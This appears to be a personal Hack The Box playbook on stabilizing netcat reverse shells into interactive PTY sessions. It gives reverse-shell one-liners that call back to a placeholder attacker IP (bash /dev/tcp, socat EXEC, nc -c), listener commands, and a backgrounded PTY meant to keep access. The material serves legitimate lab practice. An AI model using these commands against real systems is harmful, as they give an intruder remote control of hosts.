# Reverse Shell Stabilization Playbook

> **Purpose:** Reusable reference for converting unstable netcat reverse shells into fully interactive TTY shells on HTB targets.

---

## 1. Why Stabilize?

An initial reverse shell from `nc -lvnp 4444` is:

| Problem | Symptom | Impact |
|---|---|---|
| **No TTY** | No tab completion, arrow keys print escape codes like `^[[A` | Usability nightmare |
| **No job control** | `Ctrl+Z` suspends the shell on YOUR end, not the target's | Cannot background processes cleanly |
| **No SIGINT passthrough** | `Ctrl+C` kills your listener instead of the target process | Cannot interrupt commands like `tail -f` or `vim` |
| **No proper PTY** | `su`, `sudo`, `ssh`, `nano`, `less` fail or behave incorrectly | Key tools are unusable |
| **Shell exits on `exit`/`logout`** | One wrong command and you're disconnected | No persistence across session drops |

Stabilization solves all of the above by allocating a proper pseudo-terminal (PTY) on the target.

---

## 2. Python PTY Method (Primary)

Python is present on the vast majority of Linux targets. This is the fastest and most reliable method.

### Step-by-Step Procedure

**Step 1 — Spawn initial unstable shell**

```bash
# Attacker listener
nc -lvnp 4444

# Target (from web shell, RCE, etc.)
# bash reverse shell
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

**Step 2 — Upgrade to Python PTY (single command)**

From within the unstable shell on the target:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 3 — Background the shell**

```bash
# In your local terminal (NOT the reverse shell), press:
Ctrl+Z
```

**Step 4 — Configure local terminal settings**

In your local shell:

```bash
# Suspend job, then reset terminal to raw mode
stty raw -echo
```

**Step 5 — Bring the shell back to foreground**

```bash
fg
```

You now have a fully interactive, PTY-backed shell. Press `Enter` once to refresh.

### Full One-Liner (Attacker Side)

```bash
# Listen, get shell, background with Ctrl+Z, then:
stty raw -echo; fg; reset; export SHELL=bash; export TERM=xterm-256color; exec /bin/bash -l
```

---

## 3. Full Stabilized Shell Profile Setup

After getting a Python PTY shell, immediately run:

```bash
# Set a proper terminal type
export TERM=xterm-256color

# Prevent shell from exiting on EOF
set -m  # enable job control (bash)

# Optional: fix prompt
PS1='$(whoami)@$(hostname):$(pwd)$ '
```

Then background with `Ctrl+Z`, run `stty raw -echo; fg`, and you're fully stable.

### Making It Permanent

To survive disconnects and reconnection, upgrade to a meterpreter or C2 session, or:

```bash
# Background the shell first with Ctrl+Z
# On attacker: upload a statically compiled netcat with -e support
# Or on target, if python is available:

# Method: spawn pty in background, detach
python3 -c "import pty; pty.spawn(['/bin/bash', '-i'])" &
disown
```

---

## 4. Alternative Methods

### 4a. `script` Binary (No Python Needed)

Uses the `script` utility to allocate a PTY:

```bash
# From unstable shell
script -q /dev/null /bin/bash -i
```

> **Note:** `script` is installed by default on most Linux systems. This is useful when Python is not available.

### 4b. `expect` (If Available)

If `expect` is installed on the target:

```bash
#!/usr/bin/expect -f
spawn /bin/bash -i
interact
```

Run with:
```bash
expect <script.sh>
```

### 4c. `socat` (Best Stability, If Available)

```bash
# Attacker: listener
socat file:$(tty),raw,echo=0 TCP-LISTEN:4444

# Target: stable bash reverse shell
socat TCP:<ATTACKER_IP>:4444 EXEC:'bash -i',pty,stderr,sigint,setsid,sane
```

This gives the most complete PTY experience, including proper window resizing.

### 4d. Staged Payload with `nc -c` (OpenBSD netcat)

If the target has OpenBSD `nc` with `-c` (exec with chroot):

```bash
# Attacker
nc -lvnp 4444

# Target
nc -c /bin/bash <ATTACKER_IP> 4444
```

### 4e. `stty` on Target (Post-Python-PTY)

If you have a Python shell but arrow keys still misbehave:

```bash
# In the Python PTY shell
stty rows 60 cols 236
stty -echo
```

---

## 5. Troubleshooting

### Arrow keys print `^[[A`, `^[[B`, etc.

**Cause:** No PTY allocated.
**Fix:** Run `python3 -c 'import pty; pty.spawn("/bin/bash")'`

### `su` or `sudo` hangs or says "no terminal"

**Cause:** No PTY, or PTY not fully interactive.
**Fix:** Python PTY method → background → `stty raw -echo; fg`

### `Ctrl+C` kills YOUR listener instead of the process on target

**Cause:** SIGINT not forwarded through the shell.
**Fix:** After full stabilization (`stty raw -echo; fg`), Ctrl+C works correctly on target.

### `Ctrl+Z` suspends your local terminal instead of the remote process

**Cause:** Shell not backgrounded properly.
**Fix:** After `stty raw -echo`, `fg` properly brings the PTY shell to foreground.

### `script` command not found

**Cause:** `script` binary not present.
**Fix:** Use Python PTY method instead.

### Python not available

**Cause:** Minimal container or embedded system.
**Fix:**
```bash
# Try perl
perl -e 'exec "/bin/bash -i";'
# Or ruby
ruby -e 'exec "/bin/bash -i";'
# Or lua
lua -e 'os.execute("/bin/bash -i")'
```

### Shell immediately dies on connect

**Cause:** Non-interactive shell, no `-i` flag.
**Fix:** Ensure reverse shell uses `bash -i` or `sh -i`.

### `stty: standard input: Inappropriate ioctl for device`

**Cause:** No TTY available at all.
**Fix:** Ensure PTY method was applied before `stty raw -echo`.

### Meterpreter Shell Auto-Stabilization

If you have a meterpreter session:

```bash
# In meterpreter
shell
# Then stabilize from within
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg
reset
export TERM=xterm-256color
```

---

## 6. Quick Reference Cheat Sheet

### Standard Stabilization Sequence

```
1. nc -lvnp 4444                        # Attacker listener
2. bash -i >& /dev/tcp/IP/4444 0>&1     # Target gets unstable shell
3. python3 -c 'import pty; pty.spawn("/bin/bash")'   # Allocate PTY on target
4. Ctrl+Z                               # Background (local terminal)
5. stty raw -echo                       # Configure local terminal
6. fg                                   # Return to shell
7. export TERM=xterm-256color           # Set terminal type
8. [ENTER]                              # Refresh display
```

### One-Liner for Python PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### One-Liner for `script` (No Python)

```bash
script -q /dev/null /bin/bash -i
```

### socat Full PTY (Best Quality)

```bash
# Attacker
socat TCP-LISTEN:4444,reuseaddr,fork FILE:$(tty),raw,echo=0

# Target
socat TCP:<ATTACKER_IP>:4444 EXEC:'bash -i',pty,stderr,sigint,setsid,sane
```

### Full Stabilization Checklist

- [ ] PTY allocated (`python3 -c 'import pty; pty.spawn("/bin/bash")'`)
- [ ] Shell backgrounded with `Ctrl+Z`
- [ ] Local `stty raw -echo` applied
- [ ] Shell foregrounded with `fg`
- [ ] `TERM=xterm-256color` exported
- [ ] `export SHELL=bash` set
- [ ] Arrow keys work for history
- [ ] `su` / `sudo` work
- [ ] `Ctrl+C` interrupts target processes
- [ ] `Ctrl+Z` backgrounds target processes (not local shell)
- [ ] `clear` works
- [ ] Tab completion works

### Port Configuration Note

> For HTB: Use `tun0` IP (typically `10.10.14.x/23`) as the attacker IP. Ensure any local firewall allows outbound on your chosen port (e.g. 4444). Remove rules when done.
>
> ```bash
> # Check tun0 IP
> ip addr show tun0 | grep inet
>
> # Open port temporarily (run as root)
> ufw allow 4444/tcp comment 'HTB shell'
> # Remove when done
> ufw delete allow 4444/tcp
> ```

---

**Author:** Ceil (openclaw/neo workspace)
**Location:** `~/.openclaw/workspace-neo/htb/playbooks/shell-stabilization.md`
**Use:** Append notes for new methods or edge cases as encountered.
